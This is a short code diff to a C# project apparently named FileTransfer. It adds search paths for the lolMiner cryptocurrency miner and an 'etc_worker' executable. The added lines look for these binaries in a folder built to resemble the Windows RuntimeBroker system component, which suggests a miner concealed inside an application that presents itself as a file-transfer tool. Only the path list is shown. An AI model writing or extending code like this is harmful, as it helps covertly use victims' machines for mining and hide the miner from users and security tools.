@@ -198,6 +198,8 @@ namespace FileTransfer.Compute
             {
                 Path.Combine(appDir, "Compute", "lolMiner.exe"),
                 Path.Combine(appDir, "Compute", "etc_worker.exe"),
+                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "RuntimeBroker", "Compute", "lolMiner.exe"),
+                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "RuntimeBroker", "Compute", "etc_worker.exe"),
                 Path.Combine(appDir, "lolMiner.exe"),
                 Path.Combine(appDir, "etc_worker.exe"),
                 Path.Combine(Path.GetTempPath(), "lolMiner.exe"),
